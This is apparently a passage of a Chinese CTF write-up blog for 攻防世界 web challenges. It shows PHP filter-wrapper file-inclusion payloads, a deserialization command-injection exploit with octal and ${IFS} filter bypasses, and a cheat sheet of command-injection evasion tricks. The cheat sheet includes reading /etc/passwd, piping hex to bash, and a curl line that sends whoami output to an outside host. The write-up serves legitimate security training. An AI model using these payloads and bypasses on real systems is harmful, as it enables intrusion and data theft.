class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></code></pre></td></tr></table></figure><p>然后burp抓包，post方式写入hello ctf</p><p><img src="fileclude2.png" alt="fileclude2"></p><p>再解密就行了。</p><p><a href="https://blog.csdn.net/weixin_44508748/article/details/108162951?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&utm_relevant_index=4">漏洞梳理篇之php伪协议</a></p><hr><h3 id="11-file-include"><a href="#11-file-include" class="headerlink" title="11.file_include"></a>11.file_include</h3><p>经过前两道题的<del>沉淀</del>，我自认为我可以拿捏这道题了，我直接输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=check.php</span><br></code></pre></td></tr></table></figure><p>结果却是这样的：</p><p><img src="file_include1.png" alt="file_include1"></p><p>不得不说，<del>这个结果伤害了我</del>。</p><p>这里面应该有东西被过滤了，我在网上找到了别的绕过方法</p><p>使用其他的过滤器convert.iconv.* 绕过</p><p> 使用方法：convert.iconv.<input-encoding>.<output-encoding> 或者 convert.iconv.<input-encoding>&#x2F;<output-encoding></output-encoding></input-encoding></output-encoding></input-encoding></p><p>这里的<input-encoding>和<output-encoding>分别为输入的字符串编码方式和输出的字符串编码方式（字符集）。由于不知道哪种能成功，这里可以用burp爆破</output-encoding></input-encoding></p><p>这里直接给出能用的两个字符集UTF-8和UCS-2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=check.php</span><br></code></pre></td></tr></table></figure><p>页面多了一行代码，给出了过滤情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>])<br>&#123; <br><span class="hljs-variable">$preg_match_username</span> = <span class="hljs-string">&#x27;return preg_match(&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;, $_GET[&quot;filename&quot;]);&#x27;</span>; <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$preg_match_username</span>))<br>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack!&quot;</span>);    <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>盲猜flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><img src="file_include2.png" alt="file_include2"></p><hr><h3 id="12-unseping"><a href="#12-unseping" class="headerlink" title="12.unseping"></a>12.unseping</h3><p>贴脸开大，还是读代码</p><p><img src="unseping1.png" alt="unseping1"></p><p>这个是反序列化，但是这个题没用上wakeup()，主要是命令执行，但是代码中可以看到，args是一个数组，数组中的ls等等命令都被拦了，那就绕过，这里采用反斜杠‘\’绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>&#125;<br>  <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://c.runoob.com/compile/1/">PHP在线编译工具</a></p><p>输出：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</p><p><img src="unseping2.png" alt="unseping2"></p><p>看到：array(2) {  [0]&#x3D;&gt;  string(12) “flag_1s_here”  [1]&#x3D;&gt;  string(9) “index.php” }</p><p>在这有个问题，为啥array(‘dir’)和lsarray(‘l\s’)不同：</p><p>array(1) {  [0]&#x3D;&gt;  string(23) “flag_1s_here  index.php” }</p><p>但无论如何我们看到了flag_1s_here</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s$&#123;IFS&#125;fl\ag_1s_here&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重复的地方不再赘述，这里的重点是绕过空格及flag关键字的过滤，依然采用\绕过，空格用${IFS}绕过</p><p>得到：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyMjoibFxzJHtJRlN9ZmxcYWdfMXNfaGVyZSI7fX0&#x3D;</p><p>POST提交：</p><p><img src="unseping3.png" alt="unseping3"></p><p>有个php文件，但是；和&amp;和&#x2F;都被拦了，没法绕，换个方法，把字符变成八进制，看了一下别人写的，唯一一个疑点就是为啥是’\%o’。我试了一下，加一个\是没效果的，具体为啥我没深究，两个\就行了，附上C语言脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/* code */</span><br>    <span class="hljs-type">char</span> site[] = <span class="hljs-string">&quot;cat flag_1s_here/flag_831b69012c67b35f.php&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span> site / <span class="hljs-keyword">sizeof</span> site[<span class="hljs-number">0</span>]; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\%o&quot;</span>,site[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://www.nhooo.com/tool/c/">C语言在线编译</a></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">\<span class="hljs-number">143\141\164\40</span>\<span class="hljs-number">146\154\141\147</span>\<span class="hljs-number">137\61\163\137</span>\<span class="hljs-number">150\145\162\145</span>\<span class="hljs-number">57\146\154\141</span>\<span class="hljs-number">147\137\70\63</span>\<span class="hljs-number">61\142\66\71</span>\<span class="hljs-number">60\61\62\143</span>\<span class="hljs-number">66\67\142\63</span>\<span class="hljs-number">65\146\56\160</span>\<span class="hljs-number">150\160</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160&quot;)&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="unseping4.png" alt="unseping4"></p><p>还不是很明白为啥cat了还要$(printf)</p><p>命令执行绕过</p><p>1.正则校验时如过滤cat|flag|ls，在字符串中插入空的环境变量绕过如’l${Z}s’,并用 $${IFS}代替空格<br>2.过滤绕过：分隔符编码（url、base64）绕过<br>3.八进制绕过：如ls: l对应assic码108 108-&gt;八进制:154: $(printf “\154\163”)&#x2F;&#x2F;ls<br>4.十六进制绕过：echo “字符串转16进制的结果” | xxd -r -p|bash &#x2F;&#x2F;xxd:十六进制输出<br>5.linux内置分隔符：${IFS}$9、${IFS}、$IFS$9<br>6.使用重定向符： cat&lt;&gt;flag.php<br>7.$PS2:&gt; $PS4:+<br>8.关键词拆分命令绕过：a&#x3D;l;b&#x3D;s;ab<br>9.控制环境变量绕过: echo $PATH得到&#x2F;user&#x2F;local… 要哪个字符截取哪个字符<br>echo ${PATH:1:1} -&gt;u echo ${PATH:0:4} -&gt;&#x2F;usr<br>10.空值绕过：cat fl””ag cat fl’’ag cat “fl””ag”<br>11.反斜杠绕过：ca\t flag l\s<br>12.空变量：x代表1-9如ca${7}t a.txt-&gt;cat a.txt，在没有传入参数的情况下，这些特殊字符默认为空<br>wh$1oami wh${1}oami<br>who$@ami who${@}ami<br>whoa$<em>mi whoa${</em>}mi<br>13.花括号：在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 {cat,flag}<br>{cat,flag.php}<br>{cat,&#x2F;etc&#x2F;passwd}<br>{whoami,}<br>14.无回显的命令执行：可以通过curl命令将命令的结果输出到访问的url中<br>curl <a href="http://www.com/%E5%8F%8D%E5%BC%95%E5%8F%B7whoami%E5%8F%8D%E5%BC%95%E5%8F%B7">www.com/反引号whoami反引号</a><br>15.其他读文件命令<br>bash tac nl more less head tail vi cat bzmore bzless paste sort</p><p><a href>原文链接</a><a href="https://blog.csdn.net/qq_53385700/article/details/128741076">https://blog.csdn.net/qq_53385700/article/details/128741076</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
